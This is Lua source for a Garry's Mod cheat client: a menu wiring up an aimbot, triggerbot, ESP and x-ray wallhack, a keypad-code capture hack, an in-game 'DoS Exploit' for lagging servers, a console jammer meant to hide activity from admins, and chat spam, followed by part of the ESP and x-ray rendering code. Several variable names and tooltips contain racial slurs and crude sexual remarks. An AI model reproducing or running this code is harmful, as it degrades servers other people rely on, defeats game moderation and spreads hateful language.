Menu:SetTitle(jav_version.." :::::: Created by LegendofRobbo")
Menu:Center()
Menu:MakePopup()
Menu.Paint = function()
surface.SetDrawColor( 0, 0, 0, 200 )
surface.DrawRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
surface.SetDrawColor( 255,150,0,255 )
surface.DrawRect( 10, 50, 150, 2 )
surface.SetDrawColor( 255,0,0,255 )
surface.DrawRect( 10, 260, 150, 2 )
surface.SetDrawColor( 0,255,150,255 )
surface.DrawRect( 440, 50, 150, 2 )
surface.SetDrawColor( 0,150,255,255 )
surface.DrawRect( 440, 200, 150, 2 )
surface.SetDrawColor( 150,255,0,255 )
surface.DrawRect( 440, 400, 150, 2 )
surface.SetDrawColor( GColScheme )
surface.DrawOutlinedRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
 
end
 
local ESPenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ESPenable:SetPos( 10, 30 )
ESPenable:SetParent(Menu)
ESPenable:SetValue( 0 )
ESPenable:SetText( "ESP Enabled" )
ESPenable:SetConVar( "jav_esp_enabled" )
ESPenable:SetToolTip( "see players positions and other relevant info" )
ESPenable:SizeToContents()
 
local Xraydistlabel = vgui.Create( "DLabel", Panel )
Xraydistlabel:SetParent(Menu)
Xraydistlabel:SetPos( 115, 180 )
Xraydistlabel:SetText( "Range (Metres):" )
Xraydistlabel:SizeToContents()
 
local ESPdistlabel = vgui.Create( "DLabel", Panel )
ESPdistlabel:SetParent(Menu)
ESPdistlabel:SetPos( 115, 30 )
ESPdistlabel:SetText( "Range (Metres):" )
ESPdistlabel:SizeToContents()
 
local ABangle = vgui.Create( "DLabel", Panel )
ABangle:SetParent(Menu)
ABangle:SetPos( 135, 270 )
ABangle:SetText( "Max Snap Angle:" )
ABangle:SizeToContents()
 
local ABgrace = vgui.Create( "DLabel", Panel )
ABgrace:SetParent(Menu)
ABgrace:SetPos( 165, 350 )
ABgrace:SetText( "Grace Time:" )
ABgrace:SizeToContents()
 
local ABauto = vgui.Create( "DLabel", Panel )
ABauto:SetParent(Menu)
ABauto:SetPos( 10, 390 )
ABauto:SetText( "Auto Shoot Max Distance:" )
ABauto:SizeToContents()
 
local ABanglebox = vgui.Create( "DNumberWang" )// Create the checkbox
ABanglebox:SetPos( 220, 266 )
ABanglebox:SetParent(Menu)
ABanglebox:SetMin(0)
ABanglebox:SetMax(90)
ABanglebox:SetConVar( "jav_aa_angle" )
ABanglebox:SetToolTip( "how far the aimbot can snap from the cursor in degrees, smaller values make it harder for spectating admins to detect your hax" )
 
local ABgracebox = vgui.Create( "DNumberWang" )// Create the checkbox
ABgracebox:SetPos( 225, 346 )
ABgracebox:SetParent(Menu)
ABgracebox:SetMin(0)
ABgracebox:SetMax(20)
ABgracebox:SetConVar( "jav_aa_snaponaimgrace" )
ABgracebox:SetToolTip( "how long you will remain snapped after aiming/right clicking (in seconds)" )
 
local ABautobox = vgui.Create( "DNumberWang" )// Create the checkbox
ABautobox:SetPos( 140, 386 )
ABautobox:SetParent(Menu)
ABautobox:SetMin(0)
ABautobox:SetMax(10000)
ABautobox:SetConVar( "jav_aa_autoshoot" )
ABautobox:SetToolTip( "the maximum distance in metres that the hack will automatically shoot for you at (set to 0 to disable autoshoot)" )
 
local EntFbutton = vgui.Create( "DButton" )
EntFbutton:SetParent( Menu )  
EntFbutton:SetPos( 10, 180 )
EntFbutton:SetTextColor( Color(255, 255, 255, 255) )
EntFbutton:SetSize( 90, 15 )
EntFbutton:SetToolTip( "Turn the x-ray on, it helps a lot when propkilling" )
EntFbutton.Paint = function()
surface.SetDrawColor( 90, 60, 0, 200 )
EntFbutton:SetText( "Toggle X-ray" )
surface.DrawRect( 0, 0, EntFbutton:GetWide(), EntFbutton:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, EntFbutton:GetWide(), EntFbutton:GetTall() , 2)
end
EntFbutton.DoClick = function()
RunConsoleCommand("jav_xray_toggle")
end
 
local Xraymaxdist = vgui.Create( "DNumberWang" )// Create the checkbox
Xraymaxdist:SetPos( 200, 176 )
Xraymaxdist:SetParent(Menu)
Xraymaxdist:SetMin(0)
Xraymaxdist:SetMax(10000)
Xraymaxdist:SetConVar( "jav_xray_distance" )
Xraymaxdist:SetToolTip( "sets the range of your xray vision in metres" )
 
local ESPmaxdist = vgui.Create( "DNumberWang" )// Create the checkbox
ESPmaxdist:SetPos( 200, 26 )
ESPmaxdist:SetParent(Menu)
ESPmaxdist:SetMin(0)
ESPmaxdist:SetMax(10000)
ESPmaxdist:SetConVar( "jav_esp_distance" )
ESPmaxdist:SetToolTip( "sets the range of the esp in metres, crank this down if you are getting fps lag from the hack" )
 
local ESPposition = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ESPposition:SetPos( 10, 60 )
ESPposition:SetParent(Menu)
ESPposition:SetValue( 0 )
ESPposition:SetText( "Show Position" )
ESPposition:SetConVar( "jav_esp_position" )
ESPposition:SetToolTip( "isn't this y'know, the whole point of using an esp?" )
ESPposition:SizeToContents()
 
local ESPname = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ESPname:SetPos( 10, 80 )
ESPname:SetParent(Menu)
ESPname:SetValue( 0 )
ESPname:SetText( "Show Name" )
ESPname:SetConVar( "jav_esp_names" )
ESPname:SetToolTip( "shows player names, the name will also be coloured to match their team colour" )
ESPname:SizeToContents()
 
local ESPdist = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ESPdist:SetPos( 10, 100 )
ESPdist:SetParent(Menu)
ESPdist:SetValue( 0 )
ESPdist:SetText( "Show Distance" )
ESPdist:SetToolTip( "shows distance to players in metres" )
ESPdist:SetConVar( "jav_esp_showtargetdistance" )
ESPdist:SizeToContents()
 
local ESPvel = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ESPvel:SetPos( 10, 120 )
ESPvel:SetParent(Menu)
ESPvel:SetValue( 0 )
ESPvel:SetText( "Show Velocity" )
ESPvel:SetConVar( "jav_esp_velocity" )
ESPvel:SetToolTip( "shows the targets velocity (WIP!)" )
ESPvel:SizeToContents()
 
local ESPadmin = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ESPadmin:SetPos( 10, 140 )
ESPadmin:SetParent(Menu)
ESPadmin:SetValue( 0 )
ESPadmin:SetText( "Show Custom Ranks" )
ESPadmin:SetConVar( "jav_esp_admin" )
ESPadmin:SetToolTip( "detect any admins or custom ranks that are on the server" )
ESPadmin:SizeToContents()
 
local ESPbox = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ESPbox:SetPos( 10, 160 )
ESPbox:SetParent(Menu)
ESPbox:SetValue( 0 )
ESPbox:SetText( "Show Bounding Box" )
ESPbox:SetConVar( "jav_esp_box" )
ESPbox:SetToolTip( "shows a box around the player so you can accurately guage their position" )
ESPbox:SizeToContents()
 
local Scannerenabled = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Scannerenabled:SetPos( 10, 200 )
Scannerenabled:SetParent(Menu)
Scannerenabled:SetValue( 0 )
Scannerenabled:SetText( "Enable Entity Scanner" )
Scannerenabled:SetConVar( "jav_scanner_enabled" )
Scannerenabled:SetToolTip( "gives advanced info on the entity you are looking at" )
Scannerenabled:SizeToContents()
 
local Budgetenabled = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Budgetenabled:SetPos( 10, 220 )
Budgetenabled:SetParent(Menu)
Budgetenabled:SetValue( 0 )
Budgetenabled:SetText( "Budget Mode" )
Budgetenabled:SetConVar( "jav_esp_budget" )
Budgetenabled:SetToolTip( "turn this on if you have a shit pc and the esp makes you lag" )
Budgetenabled:SizeToContents()
 
local Misclabel = vgui.Create( "DLabel", Panel )
Misclabel:SetParent(Menu)
Misclabel:SetPos( 465, 30 )
Misclabel:SetText( "Miscellaneous Tools" )
Misclabel:SizeToContents()
 
local Bhopenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Bhopenable:SetPos( 425, 60 )
Bhopenable:SetParent(Menu)
Bhopenable:SetValue( 0 )
Bhopenable:SetText( "Enable Bhop" )
Bhopenable:SetConVar( "jav_bhop_enabled" )
Bhopenable:SetToolTip( "hold space to bounce around like yo mummas ass when shes riding a huge black cock" )
Bhopenable:SizeToContents()
 
local niggers = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
niggers:SetPos( 425, 430 )
niggers:SetParent(Menu)
niggers:SetValue( 0 )
niggers:SetText( "Auto Click" )
niggers:SetConVar( "jav_autoclick_enabled" )
niggers:SetToolTip( "turn this on for rope spamming and lulz" )
niggers:SizeToContents()
 
local Mirrorenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Mirrorenable:SetPos( 425, 80 )
Mirrorenable:SetParent(Menu)
Mirrorenable:SetValue( 0 )
Mirrorenable:SetText( "Enable Mirror" )
Mirrorenable:SetConVar( "jav_mirror_enabled" )
Mirrorenable:SetToolTip( "enables the rear vision mirror so people cant sneak up on you and fuck you in the ass" )
Mirrorenable:SizeToContents()
 
local Crossenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Crossenable:SetPos( 425, 100 )
Crossenable:SetParent(Menu)
Crossenable:SetValue( 0 )
Crossenable:SetText( "Enable Crosshair" )
Crossenable:SetConVar( "jav_crosshair_enabled" )
Crossenable:SetToolTip( "draws a nice circular crosshair" )
Crossenable:SizeToContents()
 
local Flashlightenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Flashlightenable:SetPos( 425, 120 )
Flashlightenable:SetParent(Menu)
Flashlightenable:SetValue( 0 )
Flashlightenable:SetText( "Enable Flashlight Spam" )
Flashlightenable:SetConVar( "jav_flashlight_enabled" )
Flashlightenable:SetToolTip( "rave party!" )
Flashlightenable:SizeToContents()
 
local Nightvisenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Nightvisenable:SetPos( 425, 140 )
Nightvisenable:SetParent(Menu)
Nightvisenable:SetValue( 0 )
Nightvisenable:SetText( "Enable Night Vision" )
Nightvisenable:SetConVar( "mat_fullbright" )
Nightvisenable:SetToolTip( "requires sv_cheats bypasser" )
Nightvisenable:SizeToContents()
 
local Witnessenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Witnessenable:SetPos( 425, 160 )
Witnessenable:SetParent(Menu)
Witnessenable:SetValue( 0 )
Witnessenable:SetText( "Enable Witness Detection" )
Witnessenable:SetConVar( "jav_witness_enabled" )
Witnessenable:SetToolTip( "allows you to see if anybody else can see you, useful for stealthy trolling" )
Witnessenable:SizeToContents()
 
local Tbotenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Tbotenable:SetPos( 425, 410 )
Tbotenable:SetParent(Menu)
Tbotenable:SetValue( 0 )
Tbotenable:SetText( "Enable Triggerbot" )
Tbotenable:SetConVar( "jav_triggerbot_enabled" )
Tbotenable:SetToolTip( "activate the triggerbot (fires your gun automatically when you look at somebody)" )
Tbotenable:SizeToContents()
 
local glabel = vgui.Create( "DLabel", Panel )
glabel:SetParent(Menu)
glabel:SetPos( 460, 180 )
glabel:SetText( "More Misc Tools" )
glabel:SizeToContents()
 
local Murderenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
Murderenable:SetPos( 425, 210 )
Murderenable:SetParent(Menu)
Murderenable:SetValue( 0 )
Murderenable:SetText( "Enable Murder Hack (broken)" )
Murderenable:SetConVar( "jav_murderhax" )
Murderenable:SetToolTip( "a special esp for the gamemode 'murder', tells you where all the murderers, gun holders and loot items are at" )
Murderenable:SizeToContents()
 
local TTTenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
TTTenable:SetPos( 425, 230 )
TTTenable:SetParent(Menu)
TTTenable:SetValue( 0 )
TTTenable:SetText( "Enable TTT Hack" )
TTTenable:SetConVar( "jav_ttthax" )
TTTenable:SetToolTip( "no traitor scum will be able to hide their presence from you with this hack turned on" )
TTTenable:SizeToContents()
 
local keypadbutton = vgui.Create( "DCheckBoxLabel" )
keypadbutton:SetPos( 425, 250 )
keypadbutton:SetParent(Menu)
keypadbutton:SetValue( 0 )
keypadbutton:SetText( "Enable DarkRP Keypad Hack" )
keypadbutton:SetConVar( "jav_keypadhax" )
keypadbutton:SetToolTip( "Waltz right into peoples bases using this useful little hack, works by saving down the correct key code as soon as anybody on the server types it into that keypad" )
keypadbutton:SizeToContents()
 
local glabel = vgui.Create( "DLabel", Panel )
glabel:SetParent(Menu)
glabel:SetPos( 470, 380 )
glabel:SetText( "Legacy/Experimental" )
glabel:SizeToContents()
 
local ABlabel = vgui.Create( "DLabel", Panel )
ABlabel:SetParent(Menu)
ABlabel:SetPos( 50, 240 )
ABlabel:SetText( "Aimbot Options" )
ABlabel:SizeToContents()
 
local ABenable = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ABenable:SetPos( 10, 270 )
ABenable:SetParent(Menu)
ABenable:SetValue( 0 )
ABenable:SetText( "Aimbot Enabled" )
ABenable:SetConVar( "jav_autoaim_enabled" )
ABenable:SetToolTip( "why aim when you can let this handy little script do all the work for you" )
ABenable:SizeToContents()
 
local ABfriends = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ABfriends:SetPos( 10, 290 )
ABfriends:SetParent(Menu)
ABfriends:SetValue( 0 )
ABfriends:SetText( "Target Steam Friends" )
ABfriends:SetConVar( "jav_aa_targetfriends" )
ABfriends:SetToolTip( "turn this off to protect your buddies from your script fuelled wrath" )
ABfriends:SizeToContents()
 
local ABteam = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ABteam:SetPos( 10, 310 )
ABteam:SetParent(Menu)
ABteam:SetValue( 0 )
ABteam:SetText( "Target Teammates" )
ABteam:SetConVar( "jav_aa_targetteam" )
ABteam:SetToolTip( "turn this off if you don't want to be a team killing bastard" )
ABteam:SizeToContents()
 
local ABheads = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ABheads:SetPos( 10, 330 )
ABheads:SetParent(Menu)
ABheads:SetValue( 0 )
ABheads:SetText( "Headshot Mode" )
ABheads:SetConVar( "jav_aa_headshot" )
ABheads:SetToolTip( "turn this on to always target enemy heads, turn it off to target their centre of mass" )
ABheads:SizeToContents()
 
local ABsnaponaim = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ABsnaponaim:SetPos( 10, 350 )
ABsnaponaim:SetParent(Menu)
ABsnaponaim:SetValue( 0 )
ABsnaponaim:SetText( "Only Snap When Aiming" )
ABsnaponaim:SetConVar( "jav_aa_snaponaim" )
ABsnaponaim:SetToolTip( "makes it so the aimbot only snaps when aiming (right mouse is pressed)" )
ABsnaponaim:SizeToContents()
 
local RadarBox = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
RadarBox:SetPos( 425, 330 )
RadarBox:SetParent(Menu)
RadarBox:SetValue( 0 )
RadarBox:SetText( "Enable Radar" )
RadarBox:SetConVar( "jav_radar_enabled" )
RadarBox:SetToolTip( "turn the radar on and off" )
RadarBox:SizeToContents()
 
local LElabel = vgui.Create( "DLabel", Panel )
LElabel:SetParent(Menu)
LElabel:SetPos( 595, 315 )
LElabel:SetText( "Radar Size:" )
LElabel:SizeToContents()
 
local LElabel = vgui.Create( "DLabel", Panel )
LElabel:SetParent(Menu)
LElabel:SetPos( 665, 315 )
LElabel:SetText( "Radar FOV:" )
LElabel:SizeToContents()
 
local RadarSize = vgui.Create( "DNumberWang" )// Create the checkbox
RadarSize:SetPos( 595, 330 )
RadarSize:SetParent(Menu)
RadarSize:SetMin(0)
RadarSize:SetMax(2000)
RadarSize:SetConVar( "jav_radar_size" )
RadarSize:SetToolTip( "Controls the onscreen size of your radar" )
 
local RadarFOV = vgui.Create( "DNumberWang" )// Create the checkbox
RadarFOV:SetPos( 665, 330 )
RadarFOV:SetParent(Menu)
RadarFOV:SetMin(0)
RadarFOV:SetMax(200)
RadarFOV:SetConVar( "jav_radar_fov" )
RadarFOV:SetToolTip( "Controls the field of vision of your radar, bigger numbers means your radar will extend further but close targets may appear too bunched up on high fov" )
 
local ABignorewalls = vgui.Create( "DCheckBoxLabel" )// Create the checkbox
ABignorewalls:SetPos( 10, 370 )
ABignorewalls:SetParent(Menu)
ABignorewalls:SetValue( 0 )
ABignorewalls:SetText( "Ignore Walls" )
ABignorewalls:SetConVar( "jav_aa_ignorewalls" )
ABignorewalls:SetToolTip( "whether or not the aimbot can target people through walls" )
ABignorewalls:SizeToContents()
 
local EntFbutton = vgui.Create( "DButton" )
EntFbutton:SetParent( Menu )  
EntFbutton:SetPos( 425, 270 )
EntFbutton:SetTextColor( Color(255, 255, 255, 255) )
EntFbutton:SetSize( 160, 15 )
EntFbutton:SetToolTip( "Toggle this to spam 5 dollar notes everywhere" )
EntFbutton.Paint = function()
surface.SetDrawColor( 0, 60, 0, 200 )
EntFbutton:SetText( "Vomit Cash (DarkRP)" )
surface.DrawRect( 0, 0, EntFbutton:GetWide(), EntFbutton:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, EntFbutton:GetWide(), EntFbutton:GetTall() , 2)
end
EntFbutton.DoClick = function()
RunConsoleCommand("jav_vomitcash")
end
 
local EntFbutton = vgui.Create( "DButton" )
EntFbutton:SetParent( Menu )  
EntFbutton:SetPos( 425, 290 )
EntFbutton:SetTextColor( Color(255, 255, 255, 255) )
EntFbutton:SetSize( 160, 15 )
EntFbutton:SetToolTip( "Toggle this to shit up chat" )
EntFbutton.Paint = function()
surface.SetDrawColor( 90, 60, 0, 200 )
EntFbutton:SetText( "Chat Spammer" )
surface.DrawRect( 0, 0, EntFbutton:GetWide(), EntFbutton:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, EntFbutton:GetWide(), EntFbutton:GetTall() , 2)
end
EntFbutton.DoClick = function()
RunConsoleCommand("jav_chatspam")
end
 
local EntFbutton = vgui.Create( "DButton" )
EntFbutton:SetParent( Menu )  
EntFbutton:SetPos( 425, 310 )
EntFbutton:SetTextColor( Color(255, 255, 255, 255) )
EntFbutton:SetSize( 160, 15 )
EntFbutton:SetToolTip( "Spin around like a spastic, will not work when the aimbot is activated" )
EntFbutton.Paint = function()
surface.SetDrawColor( 90, 90, 0, 200 )
EntFbutton:SetText( "Spinbot" )
surface.DrawRect( 0, 0, EntFbutton:GetWide(), EntFbutton:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, EntFbutton:GetWide(), EntFbutton:GetTall() , 2)
end
EntFbutton.DoClick = function()
RunConsoleCommand("jav_spinbot")
end
 
local TextEntry = vgui.Create( "DTextEntry", Menu )
TextEntry:SetPos( 595, 285 )
TextEntry:SetSize( 195, 25 )
TextEntry:SetText( GetConVarString("jav_chatspam_msg") )
TextEntry.OnEnter = function( self )
LocalPlayer():ConCommand("jav_chatspam_msg "..self:GetValue())
end
 
local LElabel = vgui.Create( "DLabel", Panel )
LElabel:SetParent(Menu)
LElabel:SetPos( 595, 265 )
LElabel:SetText( "Chat Spam Message:" )
LElabel:SizeToContents()
 
local SWbutton = vgui.Create( "DButton" )
SWbutton:SetParent( Menu )  
SWbutton:SetPos( 10, 520 )
SWbutton:SetTextColor( Color(255, 255, 255, 255) )
SWbutton:SetSize( 110, 25 )
SWbutton:SetToolTip( "leave your body as an invisible ghost and fulfil all your voyeuristic fantasies" )
SWbutton.Paint = function()
surface.SetDrawColor( 60, 0, 60, 200 )
SWbutton:SetText( "Toggle Spirit Walk" )
surface.DrawRect( 0, 0, SWbutton:GetWide(), SWbutton:GetTall() )
end
SWbutton.DoClick = function() RunConsoleCommand("jav_spiritwalk") end
 
local Namebutton = vgui.Create( "DButton" )
Namebutton:SetParent( Menu )  
Namebutton:SetPos( 130, 520 )
Namebutton:SetTextColor( Color(255, 255, 255, 255) )
Namebutton:SetSize( 110, 25 )
Namebutton:SetToolTip( "randomly change your RPname in darkrp to confuse people" )
Namebutton.Paint = function()
surface.SetDrawColor( 0, 60, 60, 200 )
Namebutton:SetText( "Randomize RPname" )
surface.DrawRect( 0, 0, Namebutton:GetWide(), Namebutton:GetTall() )
end
Namebutton.DoClick = function() RunConsoleCommand("jav_newname") end
 
local EntFbutton = vgui.Create( "DButton" )
EntFbutton:SetParent( Menu )  
EntFbutton:SetPos( 250, 520 )
EntFbutton:SetTextColor( Color(255, 255, 255, 255) )
EntFbutton:SetSize( 110, 25 )
EntFbutton:SetToolTip( "Go to the entity finder menu" )
EntFbutton.Paint = function()
surface.SetDrawColor( 60, 60, 0, 200 )
EntFbutton:SetText( "Entity Finder ESP" )
surface.DrawRect( 0, 0, EntFbutton:GetWide(), EntFbutton:GetTall() )
end
EntFbutton.DoClick = function()
RunConsoleCommand("jav_entfinder_menu")
Menu:Remove()
end
 
local Lagsploitbutton = vgui.Create( "DButton" )
Lagsploitbutton:SetParent( Menu )  
Lagsploitbutton:SetPos( 370, 520 )
Lagsploitbutton:SetTextColor( Color(255, 255, 255, 255) )
Lagsploitbutton:SetSize( 110, 25 )
Lagsploitbutton:SetToolTip( "An ingame DoS attack, will cause significant lag on any server running sandbox or a sandbox derived gamemode (AKA most gamemodes except TTT).  Multiple people firing this at once will cause even more lag." )
Lagsploitbutton.Paint = function()
surface.SetDrawColor( 60, 0, 0, 200 )
Lagsploitbutton:SetText( "DoS Exploit" )
surface.DrawRect( 0, 0, Lagsploitbutton:GetWide(), Lagsploitbutton:GetTall() )
end
Lagsploitbutton.DoClick = function() if GetConVarNumber("jav_lagsploit") == 0 then LocalPlayer():ConCommand("jav_lagsploit 1") elseif GetConVarNumber("jav_lagsploit") == 1 then LocalPlayer():ConCommand("jav_lagsploit 0")  end end
 
local JamButton = vgui.Create( "DButton" )
JamButton:SetParent( Menu )  
JamButton:SetPos( 620, 520 )
JamButton:SetTextColor( Color(255, 255, 255, 255) )
JamButton:SetSize( 110, 25 )
JamButton:SetToolTip( "Floods the console with garbage making it impossible for admins to tell whats going on" )
JamButton.Paint = function()
surface.SetDrawColor( 0, 0, 60, 200 )
JamButton:SetText( "Console Jammer" )
surface.DrawRect( 0, 0, JamButton:GetWide(), JamButton:GetTall() )
end
JamButton.DoClick = function() LocalPlayer():ConCommand("jav_console_jammer") end
 
local LElabel = vgui.Create( "DLabel", Panel )
LElabel:SetParent(Menu)
LElabel:SetPos( 485, 523 )
LElabel:SetText( "DoS Power:" )
LElabel:SizeToContents()
 
local Lagsploitbox = vgui.Create( "DNumberWang" )// Create the checkbox
Lagsploitbox:SetPos( 545, 520 )
Lagsploitbox:SetParent(Menu)
Lagsploitbox:SetMin(0)
Lagsploitbox:SetMax(1000)
Lagsploitbox:SetConVar( "jav_lagsploit_power" )
Lagsploitbox:SetToolTip( "How powerful your lagsploit is in percentage (Default is 80%).  This option is kind of redundant with the new lagsploit but i left it in anyway" )
 
local nigger = vgui.Create( "DLabel", Menu )
nigger:SetParent(Menu)
nigger:SetPos( 595, 30 )
nigger:SetText( "Colour Scheme" )
nigger:SizeToContents()
 
Mixer = vgui.Create( "DColorMixer", Menu )
--Mixer:Dock( FILL )          --Make Mixer fill place of Frame
Mixer:SetPos(595,50)
Mixer:SetSize(200,200)
Mixer:SetPalette( true )        --Show/hide the palette         DEF:true
Mixer:SetAlphaBar( true )       --Show/hide the alpha bar       DEF:true
Mixer:SetWangs( true )          --Show/hide the R G B A indicators  DEF:true
Mixer:SetColor( GColScheme )   --Set the default color
Mixer.ValueChanged = function(Mixer, color)
GColScheme = color
--LocalPlayer():ConCommand("jav_colour_r "..color.r)
--LocalPlayer():ConCommand("jav_colour_g "..color.g)
--LocalPlayer():ConCommand("jav_colour_b "..color.b)
end
 
end)
 
/*------------------------------------------
ESP
------------------------------------------*/
local function JavESP()
local ColScheme2 = Color(GColScheme.r, GColScheme.g, GColScheme.b, 255)
local ColScheme3 = Color(math.Clamp(ColScheme2.r + 100, 0, 255), math.Clamp(ColScheme2.g + 100, 0, 255), math.Clamp(ColScheme2.b + 100, 0, 255), 255)
local ColScheme4 = Color(math.Clamp(ColScheme2.r - 100, 0, 255), math.Clamp(ColScheme2.g - 100, 0, 255), math.Clamp(ColScheme2.b - 100, 0, 255), 255)
    if GetConVarNumber("jav_esp_enabled") == 1 then
    for k, e in pairs( player.GetAll() ) do
    local TeamColor = team.GetColor(e:Team())
    local Dist = math.floor(e:GetPos():Distance(LocalPlayer():GetPos()))
    local DrawDist = (GetConVarNumber("jav_esp_distance") / 0.02)
    local Meters = (math.floor(Dist * 0.02))
    local CircleSize = Dist / Dist * 10
    local wep = "Unknown"
    local SteamID = e:SteamID()
    local Name = e:Nick()
    local Group = e:GetUserGroup()
    local plypos = ( e:GetPos() + Vector( 0, 0, 40 ) ):ToScreen();
    local maxX, minX, maxY, minY, maxX2, minX2, maxY2, minY2, minYhp, maxYhp = CreatePos( e )
    local derp = (( e:GetPos() + e:GetVelocity() / 2) + Vector(0,0,40)):ToScreen()
    local derp2 = (( e:GetPos() + e:GetVelocity() / 4) + Vector(0,0,40)):ToScreen()
 
 
        if ( e != LocalPlayer() && IsCloseEnough(e)) then
            if (Dist < DrawDist) then
                if GetConVarNumber("jav_esp_position") == 1 && GetConVarNumber("jav_esp_budget") == 0 then
                    if e:Alive() then
                        if e:GetFriendStatus() == "friend" then
                          surface.DrawCircle(plypos.x, plypos.y, CircleSize, Color(0,255,0,255))
                        elseif Group ~= "user" then
                        surface.DrawCircle(plypos.x, plypos.y, CircleSize, ColScheme3)
                        else
                        surface.DrawCircle(plypos.x, plypos.y, CircleSize, ColScheme2)
                        end
                      surface.DrawCircle(plypos.x, plypos.y, CircleSize - 3, ColScheme4)
                   
                    else
                    surface.SetDrawColor(255,255,255,255)
                    surface.DrawLine( plypos.x - 10, plypos.y - 10, plypos.x +10 , plypos.y + 10 )
                    surface.DrawLine( plypos.x + 10, plypos.y - 10, plypos.x - 10 , plypos.y + 10 )
                end
                elseif GetConVarNumber("jav_esp_position") == 1 && GetConVarNumber("jav_esp_budget") == 1 then
                    surface.SetDrawColor(255,255,255,255)
                    surface.DrawRect( plypos.x - 4, plypos.y - 4, 8 , 8 )
            end
                if GetConVarNumber("jav_esp_box") == 1 then
            surface.SetDrawColor(255,150,0,255)                              
            surface.DrawLine( maxX, maxY, maxX, minY )
            surface.DrawLine( maxX, minY, minX, minY )                                    
            surface.DrawLine( minX, minY, minX, maxY )
            surface.DrawLine( minX, maxY, maxX, maxY )
            end
                if GetConVarNumber("jav_esp_velocity") == 1 then
            surface.DrawCircle(derp.x, derp.y, CircleSize +3, ColScheme2)
            surface.DrawCircle(derp2.x, derp2.y, CircleSize - 6, ColScheme2)
            end
                if GetConVarNumber("jav_esp_names") == 1 then
            if GetConVarNumber("jav_esp_budget") == 1 then
            draw.SimpleText( Name, "Trebuchet18", plypos.x - 15, plypos.y - 20, ColScheme3,4,1)
            else
            draw.SimpleTextOutlined( Name, "Trebuchet18", plypos.x - 15, plypos.y - 20, ColScheme3,4,1,1,Color(0,0,0))
            end
            end
 
            if GetConVarNumber("jav_ttthax") == 1 && e.HatTraitor == true then
            draw.SimpleTextOutlined( "TRAITOR", "Trebuchet18", plypos.x - 20, plypos.y - 35, Color(255,0,0),4,1,1,Color(0,0,0))
            end
 
 
            if GetConVarNumber("jav_esp_showtargetdistance") == 1 then
                if GetConVarNumber("jav_esp_budget") == 1 then
                draw.SimpleText( Meters.."m", "Trebuchet18", plypos.x - 12, plypos.y + 20, ColScheme4,4,1)
                else
                draw.SimpleTextOutlined( Meters.."m", "Trebuchet18", plypos.x - 12, plypos.y + 20, ColScheme4,4,1,1,Color(0,0,0))
                end
            end
 
                if GetConVarNumber("jav_esp_admin") == 1 then
                    if Group ~= "user" then
                    if GetConVarNumber("jav_esp_budget") == 1 then
                    draw.SimpleText( Group, "Trebuchet18", plypos.x - 12, plypos.y + 35, Color(200,200,200,255),4,1)
                    else
                    draw.SimpleTextOutlined( Group, "Trebuchet18", plypos.x - 12, plypos.y + 35, Color(200,200,200,255),4,1,1,Color(0,0,0))
                    end
                end
            end
 
        end
        end
end
end
end
hook.Add("HUDPaint", "JavESP", JavESP)
 
/*------------------------------------------
Xray
------------------------------------------*/
 
local Matinfo = {
["$basetexture"] = "models/debug/debugwhite",
["$model"]       = 1,
["$nocull"]      = 1,
["$ignorez"]     = 1
}
 
mat1 = (CreateMaterial( "chams", "VertexLitGeneric", Matinfo ))
mat2 = (CreateMaterial( "wireframe", "Wireframe", Matinfo ))
trans = Color(0, 255, 0, 80)
trans2 = Color(0, 255, 100)
trans3 = Color(255, 155, 0, 200)
 
function Xray()
local ColScheme = Color(GColScheme.r, GColScheme.g, GColScheme.b, 100)
local ColSchemeV = Vector(ColScheme.r / 255, ColScheme.g / 255, ColScheme.b / 255)
local ColSchemeV2 = Vector(math.Clamp(ColSchemeV.x + 0.2, 0, 1), math.Clamp(ColSchemeV.y + 0.5, 0, 1), math.Clamp(ColSchemeV.z + 0.2, 0, 1))
local Dist = (GetConVarNumber("jav_xray_distance") / 0.02 )
    if !xray then
        xray = true
        hook.Add("HUDPaint", "xxrayz", function()
            for k,v in pairs(ents.GetAll()) do
                local position = (v:GetPos()+Vector(0,0,80)):ToScreen()
                if v:GetClass()== "prop_physics" and position.x<ScrW() and position.x>0 and position.y<ScrH() and position.y>0 and (LocalPlayer():GetPos():Distance(v:GetPos()) < Dist) then
                    cam.Start3D(EyePos(),EyeAngles())
                    v:SetMaterial(mat2)
                    v:SetRenderMode(4)
                    v:SetColor(ColScheme)
                    render.SuppressEngineLighting( true )
                    render.MaterialOverride( mat1 )
                    render.SetColorModulation( ColSchemeV.x, ColSchemeV.y, ColSchemeV.z)
                    render.SetBlend(0.3)
                    v:DrawModel()
                    render.SetBlend(1)
                    render.SuppressEngineLighting( false )
                    render.MaterialOverride( )
                    cam.End3D()            
